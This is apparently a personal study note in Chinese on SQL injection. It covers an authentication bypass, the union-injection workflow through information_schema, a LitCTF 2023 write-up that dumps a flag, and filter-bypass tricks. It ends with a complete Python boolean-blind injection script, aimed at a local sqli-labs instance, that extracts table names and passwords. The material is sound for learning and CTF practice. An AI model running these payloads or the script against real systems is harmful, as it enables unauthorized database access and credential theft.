---
title: SQL注入
date: '2025-11-06 14:59:43'
updated: '2025-11-10 20:47:51'
---
注入的实质是代码和数据没有区分清楚，SQL 语句和输入可能混淆

sql注入的几种方式：联合注入、布尔盲注、时间盲注、堆叠注入以及报错注入

## 一个简单的例子
假设有一个登录页面：

```html
用户名：<input type="text" name="username">
密码：<input type="password" name="password">
```

后端代码：

```php
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $sql);
```

如果输入：

+ 用户名：`admin' --`
+ 密码：任意

最终 SQL 语句变成：

```sql
SELECT * FROM users 
WHERE username='admin' -- ' AND password='xxx'
```

`--` 是注释，后面的内容被忽略

## 大致流程
SQL注入流程：

1. 是否存在注入并且判断注入类型

2. 判断字段数 ' order by 数字 -- '

3. 确定回显点 -1 ' union select 1,2 -- '

4. 查询数据库信息 @@version @@datadir

5. 查询用户名，数据库名 user() database()

6. 查询表名 -1 ' union select 1,2, group_concat(table_name) from information_schema.tables where table_schema='数据库名' -- '

7. 查询列名 -1 ' union select 1,2, group_concat(column_name) from information_schema.columns where table_name='表名' -- '

8. 查询flag -1 ' union select 1,2, group_concat(flag所在的列名) from 表名

大概就是：

信息采集->爆破->读取所需信息

其中：

1. id 取-1 是因为没有这个合法 id 所以会返回空结果，这样原本的查询结果就不会影响我们的注入指令返回的结果
2. 后面的`-- `（注意后面接的空格）是注释往后内容的符号从而不影响注入指令

`-- '`=`--+`

## 信息采集
### information_schema
包含多个只读视图（views），每个视图对应一类元数据。以下是 MySQL 中最常用和关键的表（视图）：

| 表名 | 说明 |
| --- | --- |
| `**SCHEMATA**`<br/> 或 `**SCHEMATA**` | 列出所有数据库（schema）的信息 |
| `**TABLES**` | 列出所有数据库中的所有表（包括视图） |
| `**COLUMNS**` | 列出所有表/视图的列（字段）信息 |
| `**STATISTICS**` | 索引信息（如主键、唯一索引、普通索引等） |
| `**USER_PRIVILEGES**` | 当前用户的全局权限 |
| `**SCHEMA_PRIVILEGES**` | 数据库级别的权限 |
| `**TABLE_PRIVILEGES**` | 表级别的权限 |
| `**COLUMN_PRIVILEGES**` | 列级别的权限 |
| `**VIEWS**` | 所有视图的定义 |
| `**ROUTINES**` | 存储过程和函数的信息 |
| `**TRIGGERS**` | 触发器信息 |
| `**KEY_COLUMN_USAGE**` | 外键和主键约束信息 |
| `**REFERENTIAL_CONSTRAINTS**` | 外键约束详情 |
| `**PARTITIONS**` | 分区表信息（如果使用了分区） |
| `**ENGINES**` | 支持的存储引擎（如 InnoDB, MyISAM） |
| `**CHARACTER_SETS**` | 字符集信息 |
| `**COLLATIONS**` | 排序规则（collation）信息 |


### LitCTF 2023 这是什么？SQL ！注一下 ！
进来后发现给了sql执行语句，输入一个1看看  
![](/images/1382082f2526ad99b41367afa80aad27.jpeg)  
这里推断是两个字段，所以不进行判断了，直接闭合括号select 1,2 --   
![](/images/f89094dc08a637e5006b6e2b40cddd47.jpeg)  
这里的回显是两个语句，一个是1的正常回显，一个是我们自己输入的sql语句的回显，将前面的正常参数1改成-1即可不显示前面的内容，接下来看一下数据库名 select database(),2  
![](/images/695ebf1909d8102dc27a702690ee9c3c.jpeg)  
当前使用的数据库是ctf接下来开始查以下内容：  
1.所有数据库名：  
select group_concat(schema_name),2 from information_schema.schemata  
![](/images/2d950626e593d54c2f3672a2272c0a0a.jpeg)  
2.查数据库ctf的表名：  
select group_concat(table_name),2 from information_schema.tables where table_schema=‘ctf’  
![](/images/753e8726034a49e67b3200ba50d078cd.jpeg)  
只有一个users表  
3.查users表中的字段名：  
select group_concat(column_name),2 from information_schema.columns where table_schema=‘ctf’ and table_name=‘users’  
![](/images/45ca08dbe45c676ba60a82b2e44a2ea8.jpeg)  
4.查users表中数据：  
由于我们之前已经查询过database()我们使用的数据库就是ctf，所以直接  
select group_concat(id,0x7e,username,0x7e,password),2 from users  
![](/images/82299477deb13f0dad3f6d337f1136b8.jpeg)  
显示这是假的flag，再看其他数据库，还有一个ctftraining数据库，再从步骤2重复一次：  
select group_concat(table_name),2 from information_schema.tables where table_schema=‘ctftraining’  
![](/images/2dfe2315f8ff1409553fa8da0af7c8fc.jpeg)  
显而易见，先查flag表的字段：



select group_concat(column_name),2 from information_schema.columns where table_schema=‘ctftraining’ and table_name=‘flag’  
![](/images/3068d6cf103be8265cba07fdc71052e4.jpeg)  
只有一个flag字段，由于我们当前连接的数据库为ctf数据库，所以直接select from flag查询的是ctf数据库中的flag表，是查不到的，我们要查询的是ctftraining的ctf表，所以payload：

```plain
select flag,2 from ctftraining.flag
```

![](/images/4f3878d93c346a9185c8cc5d41abcdd6.jpeg)  
得到flag

### 细节
#### 更换符号意义
例如 SQL 语句：

```plain
select $_POST[‘query’] || flag from Flag
```

本来这个 || 是逻辑或操作，但是这里面可以通过修改 sql_mode 来把这个 || 变成 concat：

```plain
query= 1;set sql_mode=PIPES_AS_CONCAT;select 1
```

这样原本的 SQL 语句就会将 1 和 flag 一块输出

#### 绕过关键字过滤
字母单词绕过：

对抗简单字符串替换型的 WAF 或者过滤函数，例如：

```plain
nss=-1'/**/ununionion/**/select/**/1,2,3#
```

这里面的 union 是过滤关键字

空格绕过：

可以把空格换成空注释：`/**/`

## 布尔盲注
脚本：

```python
import requests

requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False
true_flag = 'You are in...'

def get_current_db(url):
    DBName = ''
    print("开始获取当前数据库名长度...")
    len = 0
    for l in range(1,99):
        payload = f"and length((select database()))={l}--+"
        res = conn.get(url+payload)
        # print(res.content.decode("utf-8"))
        if true_flag in res.content.decode("utf-8"):
            print("当前数据库名长度为："+str(l))
            len = l
            break
    print("开始获取当前数据库名...\n")
    for i in range(1, len+1):
        for j in range(33,127):
            payload = f"and ascii(substr((select database()),{i},1))={j}--+"
            res = conn.get(url=url+payload)
            if true_flag in res.content.decode("utf-8"):
                DBName += chr(j)
                print(f'\033[A'+DBName)
                break
    return DBName

def get_tb_names(url,db):
    print("正在获取数据表数量")
    tnum = 0
    t_len = 0
    tname = ""
    for i in range(1,50):
        payload = f"and (select count(*)table_name from information_schema.tables where table_schema='{db}')={i}--+"
        res = conn.get(url=url + payload)
        if true_flag in res.content.decode("utf-8"):
            tnum = i
            print(f"共有{i}张表")
            break
    print("开始获取所有表名...")
    for i in range(0,tnum):
        for n in range(1,50):
            payload = f"and length(substr((select table_name from information_schema.tables where table_schema='{db}' limit {i},1),1))={n}--+"
            res = conn.get(url=url + payload)
            if true_flag in res.content.decode("utf-8"):
                print(f"第{i+1}张表名的长度为{n}\n")
                t_len = n
                break
        for l in range(1,t_len+1):
            for j in range(33,127):
                payload = f"and ascii(substr((select table_name from information_schema.tables where table_schema='{db}' limit {i},1),{l},1))={j}--+"
                res = conn.get(url=url + payload)
                if true_flag in res.content.decode("utf-8"):
                    tname += chr(j)
                    print(f'\033[A'+tname)
                    break
        tname += ','
    result_list = tname[:-1].split(",")
    return result_list

def get_column_names(url,db,tb):
    print("正在获取列数")
    cnum = 0
    c_len = 0
    cname = ""
    for i in range(1,50):
        payload = f"and (select count(*)column_name from information_schema.columns where table_schema='{db}' and table_name='{tb}')={i}--+"
        res = conn.get(url=url + payload)
        if true_flag in res.content.decode("utf-8"):
            cnum = i
            print(f"共有{i}列")
            break
    print("开始获取所有列名...")
    for i in range(0,cnum):
        for n in range(1,50):
            payload = f"and length(substr((select column_name from information_schema.columns where table_schema='{db}' and table_name='{tb}' limit {i},1),1))={n}--+"
            res = conn.get(url=url + payload)
            if true_flag in res.content.decode("utf-8"):
                print(f"第{i+1}个列名的长度为{n}\n")
                c_len = n
                break
        for l in range(1,c_len+1):
            for j in range(33,127):
                payload = f"and ascii(substr((select column_name from information_schema.columns where table_schema='{db}' and table_name='{tb}' limit {i},1),{l},1))={j}--+"
                res = conn.get(url=url + payload)
                if true_flag in res.content.decode("utf-8"):
                    cname += chr(j)
                    print(f'\033[A'+cname)
                    break
        cname += ','
    result_list = cname[:-1].split(",")
    return result_list

def get_data(url,db,tb,cn):
    print("正在获取行数")
    lnum = 0
    for i in range(1,50):
        payload = f"and (select count(*){cn} from {db}.{tb})={i}--+"
        res = conn.get(url=url + payload)
        if true_flag in res.content.decode("utf-8"):
            lnum = i
            print(f"共有{i}行")
            break
    print("开始获取"+tb+"表中的"+cn+"数据...")
    data = ""
    for i in range(0,lnum):
        word = ""
        for n in range(1,50):
            payload = f"and length(substr((select {cn} from {db}.{tb} limit {i},1),1))={n}--+"
            res = conn.get(url=url + payload)
            if true_flag in res.content.decode("utf-8"):
                print(f"第{i+1}条数据长度为{n}")
                d_len = n
                break
        for l in range(1,d_len+1):
            for j in range(33,127):
                payload = f"and ascii(substr((select {cn} from {db}.{tb} limit {i},1),{l},1))={j}--+"
                res = conn.get(url=url + payload)
                if true_flag in res.content.decode("utf-8"):
                    data += chr(j)
                    word += chr(j)
                    # print(data)
                    break
        print(f'id={i}:{word}')
        data += ','
    result_list = data[:-1].split(",")
    return result_list


url=f'http://127.0.0.1/sqli-labs/Less-6/?id=1\"'
# db=get_current_db(url)
# tb=get_tb_names(url,db)
# cn=get_column_names(url,db,tb[3])
# get_data(url,db,tb[3],cn[1])
get_data(url,'security','users','password')
```

